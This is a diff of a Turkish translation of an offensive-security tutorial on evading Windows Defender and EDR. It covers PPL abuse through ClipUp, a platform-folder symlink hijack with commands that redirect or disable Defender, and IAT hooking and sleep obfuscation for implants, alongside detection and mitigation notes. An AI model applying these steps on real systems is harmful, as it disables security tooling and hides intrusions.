-Protected Process Light (PPL), yalnızca eşit veya daha yüksek korumalı process'lerin birbirini tamper etmesine izin veren bir signer/level hierarchy uygular. Offensively, eğer yasal olarak bir PPL-enabled binary başlatabiliyor ve argümanlarını kontrol edebiliyorsanız, benign functionality'yi (ör. logging) AV/EDR tarafından kullanılan protected directories'e karşı constrained, PPL-backed write primitive'e dönüştürebilirsiniz.
+Protected Process Light (PPL), yalnızca eşit veya daha yüksek seviyede korunan process'lerin birbirlerine müdahale edebilmesini sağlamak için bir signer/level hiyerarşisi uygular. Offensive açıdan, PPL-enabled bir binary'yi meşru biçimde başlatabiliyor ve argümanlarını kontrol edebiliyorsanız, benign bir işlevi (ör. logging) AV/EDR tarafından kullanılan protected directory'lere karşı kısıtlı, PPL-backed bir write primitive'e dönüştürebilirsiniz.
 
-Bir process'in PPL olarak çalışmasını sağlayan şey
-- Target EXE (ve yüklenen herhangi bir DLL) PPL-capable bir EKU ile imzalanmış olmalıdır.
-- Process, CreateProcess ile şu flags kullanılarak oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
-- Binary'nin signer'ı ile eşleşen uyumlu bir protection level istenmelidir (ör. anti-malware signer'lar için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signer'lar için `PROTECTION_LEVEL_WINDOWS`). Yanlış seviyeler oluşturma aşamasında başarısız olur.
+Bir process'i PPL olarak çalıştıran unsurlar
+- Hedef EXE (ve yüklenen tüm DLL'ler), PPL-capable bir EKU ile imzalanmış olmalıdır.
+- Process, şu flags kullanılarak CreateProcess ile oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
+- Binary'nin signer'ı ile eşleşen compatible bir protection level talep edilmelidir (ör. anti-malware signer'ları için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signer'ları için `PROTECTION_LEVEL_WINDOWS`). Yanlış level'lar creation işleminin başarısız olmasına neden olur.
 
-PP/PPL ve LSASS protection'a daha geniş bir giriş için ayrıca şuna bakın:
+PP/PPL ve LSASS protection hakkında daha geniş bir giriş için ayrıca bkz.:
 
 {{#ref}}
 stealing-credentials/credentials-protections.md
 {{#endref}}
 
 Launcher tooling
-- Open-source helper: CreateProcessAsPPL (protection level seçer ve arguments'i target EXE'ye iletir):
+- Open-source helper: CreateProcessAsPPL (protection level'ı seçer ve argümanları hedef EXE'ye iletir):
 - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
-- Kullanım kalıbı:
+- Kullanım pattern'i:
 ```text
 CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
 # example: spawn a Windows-signed component at PPL level 1 (Windows)
@@ -890,19 +891,19 @@ CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
 CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
 ```
 LOLBIN primitive: ClipUp.exe
-- İmzalı sistem binary `C:\Windows\System32\ClipUp.exe` kendini spawn eder ve çağıranın belirttiği bir path’e log dosyası yazmak için bir parameter kabul eder.
-- PPL process olarak başlatıldığında, file write PPL backing ile gerçekleşir.
-- ClipUp, içinde spaces bulunan path’leri parse edemez; normalde protected location’lara işaret etmek için 8.3 short paths kullanın.
+- İmzalı sistem binary'si `C:\Windows\System32\ClipUp.exe` kendisini yeniden başlatır ve caller tarafından belirtilen bir path'e log file yazmak için bir parametre kabul eder.
+- PPL process olarak başlatıldığında file write işlemi PPL backing ile gerçekleşir.
+- ClipUp, spaces içeren path'leri parse edemez; normalde korunan konumları göstermek için 8.3 short path'leri kullanın.
 
 8.3 short path helpers
-- Short names listele: her parent directory içinde `dir /x`.
-- cmd içinde short path türet: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`
+- Short name'leri listelemek için her parent directory'de `dir /x` çalıştırın.
+- cmd'de short path türetmek için: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`
 
 Abuse chain (abstract)
-1) PPL-capable LOLBIN’i (ClipUp) bir launcher (ör. CreateProcessAsPPL) ile `CREATE_PROTECTED_PROCESS` kullanarak başlatın.
-2) ClipUp log-path argument’ını geçirerek protected bir AV directory içinde dosya creation’ı zorlayın (ör. Defender Platform). Gerekirse 8.3 short names kullanın.
-3) Target binary, çalışırken AV tarafından normalde açık/locked durumdaysa (ör. MsMpEng.exe), AV başlamadan önce boot sırasında yazmayı planlayın; bunun için daha erken güvenilir şekilde çalışan bir auto-start service kurun. Boot ordering’i Process Monitor (boot logging) ile doğrulayın.
-4) Reboot sonrası PPL-backed write, AV kendi binaries’ini lock’lamadan önce gerçekleşir; target file corrupt olur ve startup engellenir.
+1) PPL-capable LOLBIN'i (ClipUp) bir launcher (ör. CreateProcessAsPPL) kullanarak `CREATE_PROTECTED_PROCESS` ile başlatın.
+2) Korumalı bir AV directory'sinde (ör. Defender Platform) file creation işlemini zorlamak için ClipUp log-path argument'ını geçin. Gerekirse 8.3 short name'leri kullanın.
+3) Hedef binary çalışırken AV tarafından normalde open/locked durumdaysa (ör. MsMpEng.exe), write işlemini boot sırasında, AV başlamadan önce çalışacak şekilde planlayın; bunu daha erken ve güvenilir biçimde çalıştıran bir auto-start service yükleyin. Boot ordering'i Process Monitor (boot logging) ile doğrulayın.
+4) Reboot sonrasında PPL-backed write, AV binary'lerini lock'lamadan önce gerçekleşir; hedef file'ı corrupt ederek startup'ı engeller.
 
 Example invocation (paths redacted/shortened for safety):
 ```text
@@ -910,52 +911,52 @@ Example invocation (paths redacted/shortened for safety):
 CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
 ```
 Notlar ve kısıtlamalar
-- ClipUp’un ne yazacağını yerleşim dışında kontrol edemezsiniz; bu primitive, hassas içerik enjeksiyonundan ziyade corruption için uygundur.
-- Bir service kurmak/başlatmak için local admin/SYSTEM ve bir reboot penceresi gerekir.
-- Zamanlama kritiktir: hedef açık olmamalıdır; boot-time execution file lock’ları önler.
+- ClipUp'ın yazdığı içerikleri yerleştirme dışında kontrol edemezsiniz; primitive, hassas içerik enjeksiyonundan ziyade bozulma için uygundur.
+- Bir service'i kurmak/başlatmak ve reboot penceresine sahip olmak için local admin/SYSTEM gerekir.
+- Zamanlama kritiktir: hedef açık olmamalıdır; boot-time execution file lock'larını önler.
 
 Tespitler
-- `ClipUp.exe` için olağandışı argümanlarla process creation, özellikle standart olmayan launcher’lar tarafından parented edilmişse, boot civarında.
-- Auto-start olarak yapılandırılmış yeni services ve Defender/AV’den sürekli önce başlayan şüpheli binaries. Defender başlangıç hatalarından önce yapılan service creation/modification işlemlerini inceleyin.
-- Defender binary’leri/Platform dizinlerinde file integrity monitoring; protected-process flags olan süreçler tarafından yapılan beklenmedik file creation/modification işlemleri.
-- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` ile oluşturulan süreçleri ve AV dışı binary’ler tarafından anomal PPL level kullanımını arayın.
+- Özellikle boot sırasında, alışılmadık argümanlarla çalıştırılan `ClipUp.exe` process creation olayları; özellikle parent process'i standart olmayan launcher'lar ise.
+- Şüpheli binary'leri auto-start olarak yapılandıran ve Defender/AV'den önce tutarlı şekilde başlayan yeni service'ler. Defender startup failures öncesindeki service oluşturma/değişikliklerini araştırın.
+- Defender binary'leri/Platform dizinlerinde file integrity monitoring; protected-process flag'lerine sahip process'ler tarafından beklenmeyen file creation/modification olayları.
+- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` ile oluşturulan process'leri ve AV dışı binary'ler tarafından kullanılan anomalous PPL level'larını arayın.
 
-Azaltmalar
-- WDAC/Code Integrity: hangi signed binaries’nin PPL olarak ve hangi parent’lar altında çalışabileceğini kısıtlayın; meşru bağlamlar dışında ClipUp invocation’ını engelleyin.
-- Service hygiene: auto-start services oluşturulmasını/değiştirilmesini kısıtlayın ve start-order manipulation’ı izleyin.
-- Defender tamper protection ve early-launch protections etkin olsun; binary corruption gösteren startup hatalarını inceleyin.
-- Ortamınızla uyumluysa, security tooling barındıran volumes üzerinde 8.3 short-name generation’ı devre dışı bırakmayı düşünün (iyice test edin).
+Azaltımlar
+- WDAC/Code Integrity: hangi signed binary'lerin PPL olarak ve hangi parent process'ler altında çalışabileceğini kısıtlayın; ClipUp invocation'ını meşru context'ler dışında engelleyin.
+- Service hygiene: auto-start service'lerinin oluşturulmasını/değiştirilmesini kısıtlayın ve start-order manipulation'ı izleyin.
+- Defender tamper protection ve early-launch protections'ın etkin olduğundan emin olun; binary corruption'a işaret eden startup error'larını araştırın.
+- Ortamınızla uyumluysa security tooling barındıran volume'larda 8.3 short-name generation'ı devre dışı bırakmayı değerlendirin (kapsamlı şekilde test edin).
 
-PPL ve tooling için referanslar
+PPL ve tooling referansları
 - Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
 - EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
 - Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
 - CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
 - Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html
 
-## Platform Version Folder Symlink Hijack ile Microsoft Defender Tampering
+## Platform Version Folder Symlink Hijack ile Microsoft Defender'a Tampering
 
-Windows Defender, çalışacağı platform’u şu konum altındaki alt klasörleri numaralandırarak seçer:
+Windows Defender, çalışacağı platformu şu konumun altındaki subfolder'ları enumerate ederek seçer:
 - `C:\ProgramData\Microsoft\Windows Defender\Platform\`
 
-En yüksek lexicographic version string’e sahip alt klasörü seçer (ör. `4.18.25070.5-0`), ardından Defender service processes’lerini buradan başlatır (service/registry paths buna göre güncellenir). Bu seçim, directory reparse points (symlinks) dahil directory entries’e güvenir. Bir administrator bunu, Defender’ı attacker-writable bir path’e yönlendirmek ve DLL sideloading veya service disruption elde etmek için kullanabilir.
+En yüksek lexicographic version string'e sahip subfolder'ı (ör. `4.18.25070.5-0`) seçer, ardından Defender service process'lerini buradan başlatır (service/registry path'lerini buna göre günceller). Bu seçim, directory reparse point'leri (symlink'ler) dahil olmak üzere directory entry'lerine güvenir. Bir administrator, Defender'ı attacker-writable bir path'e yönlendirmek ve DLL sideloading veya service disruption elde etmek için bundan yararlanabilir.
 
-Önkoşullar
-- Local Administrator (Platform folder altında directories/symlinks oluşturmak için gerekir)
-- Reboot etme veya Defender platform yeniden-seçimini tetikleme yeteneği (boot sırasında service restart)
+Ön koşullar
+- Local Administrator (Platform folder altında directory/symlink oluşturmak için gerekir)
+- Reboot yapabilme veya Defender platform re-selection'ını tetikleyebilme (boot sırasında service restart)
 - Yalnızca built-in tools gerekir (mklink)
 
 Neden çalışır
-- Defender kendi folders’ındaki writes’i engeller, ancak platform seçimi directory entries’e güvenir ve hedefin protected/trusted bir path’e çözümlendiğini doğrulamadan lexicographic olarak en yüksek version’u seçer.
+- Defender kendi folder'larına yapılan write işlemlerini engeller; ancak platform selection directory entry'lerine güvenir ve target'ın protected/trusted path'e çözümlendiğini doğrulamadan lexicographically en yüksek version'ı seçer.
 
 Adım adım (örnek)
-1) Mevcut platform folder’ın writable bir kopyasını hazırlayın, ör. `C:\TMP\AV`:
+1) Mevcut platform folder'ının writable bir clone'unu hazırlayın; ör. `C:\TMP\AV`:
 ```cmd
 set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
 set DST="C:\TMP\AV"
 robocopy %SRC% %DST% /MIR
 ```
-2) Platform içinde, klasörünüze işaret eden daha yüksek sürümlü bir directory symlink oluşturun:
+2) Platform içinde klasörünüze işaret eden daha yüksek sürümlü bir dizin symlink'i oluşturun:
 ```cmd
 mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
 ```
@@ -963,39 +964,39 @@ mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C
 ```cmd
 shutdown /r /t 0
 ```
-4) MsMpEng.exe (WinDefend)’in yönlendirilmiş path’ten çalıştığını doğrulayın:
+4) MsMpEng.exe'nin (WinDefend) redirected path'ten çalıştığını doğrulayın:
 ```powershell
 Get-Process MsMpEng | Select-Object Id,Path
 # or
 wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
 ```
-Yeni süreç yolunu `C:\TMP\AV\` altında ve bu konumu yansıtan servis yapılandırmasını/registry’yi gözlemlemelisiniz.
+`C:\TMP\AV\` altındaki yeni process path'i ve service configuration/registry'nin bu konumu yansıttığını gözlemlemelisiniz.
 
 Post-exploitation seçenekleri
-- DLL sideloading/code execution: Defender’ın uygulama dizininden yüklediği DLL’leri bırak/değiştirerek Defender’ın süreçlerinde code execute et. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
-- Service kill/denial: version-symlink’i kaldırın; böylece bir sonraki başlangıçta yapılandırılan yol resolve olmaz ve Defender başlatılamaz:
+- DLL sideloading/code execution: Defender'ın application directory'sinden yüklediği DLL'leri bırakarak/değiştirerek Defender process'lerinde code execution gerçekleştirin. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
+- Service kill/denial: version-symlink'i kaldırın; böylece bir sonraki başlatmada configured path çözümlenemez ve Defender başlatılamaz:
 ```cmd
 rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
 ```
 > [!TIP]
-> Not: Bu teknik tek başına privilege escalation sağlamaz; admin rights gerektirir.
+> Bu tekniğin tek başına privilege escalation sağlamadığını unutmayın; admin rights gerektirir.
 
 ## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)
 
-Red teams, runtime evasion’ı C2 implant’inden çıkarıp target module’in kendisine taşıyabilir; bunun için Import Address Table (IAT)’ini hook’layıp seçili API’leri attacker-controlled, position‑independent code (PIC) üzerinden yönlendirebilirler. Bu, evasion’ı birçok kit’in sunduğu küçük API yüzeyinin ötesine geneller (ör. CreateProcessA) ve aynı korumaları BOFs ile post‑exploitation DLL’lere de genişletir.
+Red team'ler, runtime evasion'ı C2 implant'ından çıkarıp hedef modülün içine taşıyabilir; bunun için modülün Import Address Table'ını (IAT) hook'lar ve seçilen API'leri attacker-controlled, position-independent code (PIC) üzerinden yönlendirir. Bu yaklaşım, evasion'ı birçok kit'in sunduğu küçük API yüzeyinin (ör. CreateProcessA) ötesine taşır ve aynı korumaları BOF'lar ile post-exploitation DLL'lerine de genişletir.
 
 High-level approach
-- Target module’in yanına reflective loader kullanarak bir PIC blob yerleştirin (prepended veya companion). PIC self‑contained ve position‑independent olmalıdır.
-- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR üzerinde gezinin ve hedef import’ların IAT entry’lerini (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ince PIC wrapper’lara patch’leyin.
-- Her PIC wrapper, gerçek API address’ine tail‑call yapmadan önce evasion’ları çalıştırır. Tipik evasion’lar şunları içerir:
-- Call öncesi memory mask/unmask (ör. beacon region’larını encrypt etmek, RWX→RX, page name/permission değiştirmek) ve ardından call sonrası restore etmek.
-- Call-stack spoofing: benign bir stack oluşturup target API’ye geçiş yapmak, böylece call-stack analysis beklenen frame’leri çözer.
-- Compatibility için, bir Aggressor script’in (veya eşdeğerinin) Beacon, BOFs ve post-ex DLL’ler için hangi API’lerin hook’lanacağını kaydedebilmesi adına bir interface export edin.
+- Reflective loader kullanarak hedef modülün yanında bir PIC blob stage edin (prepend edilmiş veya companion). PIC self-contained ve position-independent olmalıdır.
+- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR üzerinden ilerleyin ve hedeflenen import'lar (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) için IAT entry'lerini thin PIC wrapper'lara işaret edecek şekilde patch'leyin.
+- Her PIC wrapper, gerçek API'ye tail-call yapmadan önce evasion'ları çalıştırır. Tipik evasion'lar şunlardır:
+- Call etrafında memory mask/unmask uygulama (ör. beacon region'larını encrypt etme, RWX→RX, page name/permission'larını değiştirme), ardından call sonrası geri yükleme.
+- Call-stack spoofing: benign bir stack oluşturun ve target API'ye geçiş yapın; böylece call-stack analysis beklenen frame'leri çözümler.
+- Uyumluluk için bir interface export edin; böylece bir Aggressor script (veya eşdeğeri) Beacon, BOF'lar ve post-ex DLL'leri için hangi API'lerin hook'lanacağını register edebilir.
 
 Why IAT hooking here
-- Tool code’unu değiştirmeden veya Beacon’ın belirli API’leri proxy etmesine güvenmeden, hooked import’u kullanan her kod için çalışır.
-- Post-ex DLL’leri kapsar: LoadLibrary* hook’lamak module load’larını (ör. System.Management.Automation.dll, clr.dll) intercept etmenizi ve aynı masking/stack evasion’ı onların API çağrılarına uygulamanızı sağlar.
-- CreateProcessA/W’yi wrap ederek call-stack–based detection’lara karşı process-spawning post-ex komutlarının güvenilir kullanımını geri kazandırır.
+- Hook'lanmış import'u kullanan tüm code için çalışır; tool code'unu değiştirmeyi veya belirli API'leri proxy'lemesi için Beacon'a güvenmeyi gerektirmez.
+- Post-ex DLL'lerini kapsar: LoadLibrary* hook'lamak, modül yüklemelerini intercept etmenizi (ör. System.Management.Automation.dll, clr.dll) ve aynı masking/stack evasion'ı bunların API call'larına uygulamanızı sağlar.
+- CreateProcessA/W'yi wrap ederek call-stack-based detection'lara karşı process-spawning post-ex command'lerinin güvenilir kullanımını geri getirir.
 
 Minimal IAT hook sketch (x64 C/C++ pseudocode)
 ```c
@@ -1006,149 +1007,244 @@ Minimal IAT hook sketch (x64 C/C++ pseudocode)
 // Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
 ```
 Notlar
-- Yaması relocations/ASLR sonrası ve import ilk kullanımından önce uygula. TitanLdr/AceLdr gibi reflective loaders, yüklenen module'ün DllMain sırasında hooking yapmayı gösterir.
-- Wrapper'ları küçük ve PIC-safe tut; gerçek API'yi, patching öncesi yakaladığın original IAT value üzerinden ya da LdrGetProcedureAddress ile çöz.
-- PIC için RW → RX geçişleri kullan ve writable+executable page'ler bırakmaktan kaçın.
+- Patch'i relocations/ASLR sonrasında ve import'un ilk kullanımından önce uygulayın. TitanLdr/AceLdr gibi Reflective loader'lar, yüklenen modülün DllMain'i sırasında hooking işlemini gösterir.
+- Wrapper'ları küçük ve PIC-safe tutun; gerçek API'yi patch işleminden önce yakaladığınız original IAT değerinden veya LdrGetProcedureAddress üzerinden resolve edin.
+- PIC için RW → RX geçişleri kullanın ve writable+executable sayfalar bırakmaktan kaçının.
 
-Call‑stack spoofing stub
-- Draugr‑style PIC stubs, sahte bir call chain oluşturur (return addresses benign modules içine) ve sonra gerçek API'ye pivot eder.
-- Bu, Beacon/BOFs'tan sensitive APIs'lere canonical stack bekleyen detections'ları bozar.
-- API prologue'dan önce beklenen frames içine inmek için stack cutting ve stack stitching teknikleriyle birlikte kullan.
+Call-stack spoofing stub
+- Draugr tarzı PIC stub'ları sahte bir call chain oluşturur (return address'ler benign modüllerin içine işaret eder) ve ardından gerçek API'ye pivot eder.
+- Bu, Beacon/BOF'lardan sensitive API'lere giden canonical stack'leri bekleyen detection'ları etkisiz hâle getirir.
+- API prologue'undan önce beklenen frame'lerin içine yerleşmek için stack cutting/stack stitching teknikleriyle birlikte kullanın.
 
 Operational integration
-- Reflective loader'ı post-ex DLL'lerin başına ekle, böylece PIC ve hooks DLL yüklenince otomatik initialize olur.
-- Target APIs'leri kaydetmek için bir Aggressor script kullan; böylece Beacon ve BOFs aynı evasion path'ten kod değişikliği olmadan transparently faydalanır.
+- PIC ve hook'ların DLL yüklendiğinde otomatik olarak initialize olması için reflective loader'ı post-ex DLL'lerin başına ekleyin.
+- Beacon ve BOF'ların code değişikliği olmadan aynı evasion path'ten şeffaf şekilde yararlanması için bir Aggressor script kullanarak target API'leri register edin.
 
 Detection/DFIR considerations
-- IAT integrity: non-image (heap/anon) address'lere çözümlenen entries; import pointers için periyodik verification.
-- Stack anomalies: loaded images'a ait olmayan return addresses; non-image PIC'ye ani geçişler; tutarsız RtlUserThreadStart ancestry.
-- Loader telemetry: IAT içine process içi writes, import thunks'u değiştiren erken DllMain activity, load sırasında oluşturulan beklenmedik RX region'lar.
-- Image-load evasion: Eğer LoadLibrary* hooking yapılıyorsa, memory masking events ile korele automation/clr assemblies'nin şüpheli yüklemelerini izle.
+- IAT integrity: non-image (heap/anon) adreslerine resolve olan entry'ler; import pointer'larının periyodik doğrulanması.
+- Stack anomalies: loaded image'lara ait olmayan return address'ler; non-image PIC'e ani geçişler; tutarsız RtlUserThreadStart ancestry.
+- Loader telemetry: IAT üzerinde in-process write işlemleri, import thunk'larını değiştiren erken DllMain activity'si, load sırasında oluşturulan beklenmeyen RX bölgeleri.
+- Image-load evasion: hooking LoadLibrary* kullanılıyorsa, memory masking event'leriyle ilişkili şüpheli automation/clr assembly load işlemlerini izleyin.
 
 Related building blocks and examples
-- Load sırasında IAT patching yapan reflective loaders (örn. TitanLdr, AceLdr)
-- Memory masking hooks (örn. simplehook) ve stack-cutting PIC (stackcutting)
-- PIC call-stack spoofing stubs (örn. Draugr)
+- Load sırasında IAT patching gerçekleştiren reflective loader'lar (ör. TitanLdr, AceLdr)
+- Memory masking hook'ları (ör. simplehook) ve stack-cutting PIC (stackcutting)
+- PIC call-stack spoofing stub'ları (ör. Draugr)
 
 
 ## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)
 
-### Resident bir PICO üzerinden import-time IAT hooks
+### Import-time IAT hooks via a resident PICO
 
-Bir reflective loader'ı kontrol ediyorsan, `ProcessImports()` sırasında loader'ın `GetProcAddress` pointer'ını önce hook'ları kontrol eden custom bir resolver ile değiştirerek imports'ları **import sırasında** hook'layabilirsin:
+Bir reflective loader'ı kontrol ediyorsanız, loader'ın `GetProcAddress` pointer'ını önce hook'ları kontrol eden custom bir resolver ile değiştirerek import'ları **`ProcessImports()` sırasında** hook'layabilirsiniz:
 
-- Geçici loader PIC kendini free ettikten sonra da yaşayan, kalıcı bir **resident PICO** (persistent PIC object) oluştur.
-- Loader'ın import resolver'ını overwrite eden bir `setup_hooks()` function export et (örn. `funcs.GetProcAddress = _GetProcAddress`).
-- `_GetProcAddress` içinde ordinal imports'u atla ve `__resolve_hook(ror13hash(name))` gibi hash-based hook lookup kullan. Hook varsa onu döndür; yoksa gerçek `GetProcAddress`'e delege et.
-- Crystal Palace `addhook "MODULE$Func" "hook"` entries ile hook targets'ları link time'da register et. Hook, resident PICO içinde yaşadığı için valid kalır.
+- Transient loader PIC kendisini free ettikten sonra da hayatta kalan bir **resident PICO** (persistent PIC object) oluşturun.
+- Loader'ın import resolver'ını overwrite eden bir `setup_hooks()` function'ı export edin (ör. `funcs.GetProcAddress = _GetProcAddress`).
+- `_GetProcAddress` içinde ordinal import'larını atlayın ve `__resolve_hook(ror13hash(name))` gibi hash-based bir hook lookup kullanın. Bir hook varsa onu return edin; aksi hâlde gerçek `GetProcAddress`'e delegate edin.
+- Hook target'larını link time'da Crystal Palace `addhook "MODULE$Func" "hook"` entry'leriyle register edin. Hook, resident PICO'nun içinde bulunduğu için geçerliliğini korur.
 
-Bu, yüklenen DLL'in code section'ını load sonrası patching yapmadan **import-time IAT redirection** sağlar.
+Bu yöntem, loaded DLL'nin code section'ını load sonrasında patch'lemeden **import-time IAT redirection** sağlar.
 
-### Target PEB-walking kullanıyorsa hook yapılabilir imports'u zorlamak
+### Forcing hookable imports when the target uses PEB-walking
 
-Import-time hooks yalnızca function target'ın IAT'sinde gerçekten varsa tetiklenir. Bir module APIs'leri PEB-walk + hash ile çözümlüyorsa (import entry yoksa), loader'ın `ProcessImports()` yolunun onu görmesi için gerçek bir import zorla:
+Import-time hook'lar yalnızca function target'ın IAT'sinde gerçekten bulunuyorsa tetiklenir. Bir modül API'leri PEB-walk + hash üzerinden resolve ediyorsa (import entry yoksa), loader'ın `ProcessImports()` path'inin bunu görmesi için gerçek bir import zorlayın:
 
-- Hash'li export resolution'ı (örn. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir referansla değiştir.
-- Compiler bir IAT entry üretir; böylece reflective loader imports'ları çözerken interception mümkün olur.
+- Hashed export resolution'ı (ör. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir reference ile değiştirin.
+- Compiler bir IAT entry üretir ve reflective loader import'ları resolve ederken interception mümkün olur.
 
-### Sleep/idle obfuscation için `Sleep()` patch'lemeden Ekko-style yöntem
+### Ekko-style sleep/idle obfuscation without patching `Sleep()`
 
-`Sleep` patch'lemek yerine, implant'ın kullandığı **gerçek wait/IPC primitive'lerini** hook'la (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Uzun waits için, idle sırasında in-memory image'ı şifreleyen Ekko-style bir obfuscation chain içinde çağrıyı sar:
+`Sleep` patch'lemek yerine implant'ın kullandığı **gerçek wait/IPC primitive'lerini** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) hook'layın. Uzun wait'ler için çağrıyı, idle sırasında in-memory image'ı encrypt eden Ekko tarzı bir obfuscation chain içine wrap edin:
 
-- `CreateTimerQueueTimer` kullanarak `NtContinue`'u crafted `CONTEXT` frames ile çağıran bir callback dizisi planla.
-- Tipik chain (x64): image'ı `PAGE_READWRITE` yap → `advapi32!SystemFunction032` ile tam mapped image üzerinde RC4 encrypt et → blocking wait'i gerçekleştir → RC4 decrypt et → PE sections boyunca dolaşarak section başına permissions'ları **geri yükle** → completion signal ver.
-- `RtlCaptureContext` bir template `CONTEXT` sağlar; bunu birden fazla frame'e kopyala ve her adımı invoke etmek için register'ları (`Rip/Rcx/Rdx/R8/R9`) ayarla.
+- `NtContinue`'u crafted `CONTEXT` frame'leriyle çağıran bir callback sequence planlamak için `CreateTimerQueueTimer` kullanın.
+- Tipik chain (x64): image'ı `PAGE_READWRITE` olarak ayarlayın → full mapped image üzerinde `advapi32!SystemFunction032` ile RC4 encrypt uygulayın → blocking wait gerçekleştirin → RC4 decrypt uygulayın → PE section'ları walk ederek **per-section permission'ları restore edin** → completion sinyali gönderin.
+- `RtlCaptureContext` bir template `CONTEXT` sağlar; bunu birden fazla frame'e clone edin ve her adımı invoke etmek için register'ları (`Rip/Rcx/Rdx/R8/R9`) ayarlayın.
 
-Operational detail: uzun waits için çağırana “success” döndür (örn. `WAIT_OBJECT_0`), böylece image masked durumdayken caller devam eder. Bu pattern module'ü idle windows sırasında scanner'lardan saklar ve klasik “patched `Sleep()`” signature'ından kaçınır.
+Operational detail: Uzun wait'ler için (ör. `WAIT_OBJECT_0`) “success” return edin; böylece image maskelenmişken caller devam eder. Bu pattern, idle window'ları sırasında modülü scanner'ların gizler ve klasik “patched `Sleep()`” signature'ından kaçınır.
 
 Detection ideas (telemetry-based)
-- `NtContinue`'a işaret eden `CreateTimerQueueTimer` callback'lerinin burst'leri.
-- Büyük, contiguous image-sized buffer'lar üzerinde kullanılan `advapi32!SystemFunction032`.
-- Ardından custom per-section permission restoration gelen geniş aralıklı `VirtualProtect`.
+- `NtContinue`'a işaret eden `CreateTimerQueueTimer` callback burst'leri.
+- Büyük, contiguous ve image-size'ındaki buffer'lar üzerinde kullanılan `advapi32!SystemFunction032`.
+- Custom per-section permission restoration tarafından takip edilen geniş aralıklı `VirtualProtect`.
 
-### Sleep-obfuscation gadget'ları için runtime CFG registration
+### Runtime CFG registration for sleep-obfuscation gadgets
 
-CFG-enabled target'larda, `jmp [rbx]` veya `jmp rdi` gibi mid-function gadget'a yapılan ilk indirect jump genellikle process'i `STATUS_STACK_BUFFER_OVERRUN` ile crash eder; çünkü gadget module'ün CFG metadata'sında yoktur. Hardened process'ler içinde Ekko/Kraken-style chain'leri yaşatmak için:
+CFG-enabled target'larda `jmp [rbx]` veya `jmp rdi` gibi bir mid-function gadget'a yapılan ilk indirect jump genellikle process'i `STATUS_STACK_BUFFER_OVERRUN` ile crash ettirir; çünkü gadget modülün CFG metadata'sında bulunmaz. Ekko/Kraken tarzı chain'leri hardened process'ler içinde çalışır durumda tutmak için:
 
-- Chain'in kullandığı her indirect destination'ı `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ve `CFG_CALL_TARGET_VALID` entries ile register et.
-- Loaded image'lar (`ntdll`, `kernel32`, `advapi32`) içindeki address'ler için `MEMORY_RANGE_ENTRY` **image base**'ten başlamalı ve **full image size**'ı kapsamalıdır.
-- Manually mapped/PIC/stomped region'lar için bunun yerine **allocation base** ve allocation size kullan.
-- Sadece dispatch gadget'ı değil, indirect olarak ulaşılan exports'ları (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) ve indirect target olacak attacker-controlled executable section'ları da işaretle.
+- Chain tarafından kullanılan her indirect destination'ı `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ve `CFG_CALL_TARGET_VALID` entry'leriyle register edin.
+- Loaded image'ların (`ntdll`, `kernel32`, `advapi32`) içindeki adreslerde `MEMORY_RANGE_ENTRY`, **image base** ile başlamalı ve **full image size**'ı kapsamalıdır.
+- Manually mapped/PIC/stomped bölgeler için bunun yerine **allocation base** ve allocation size kullanın.
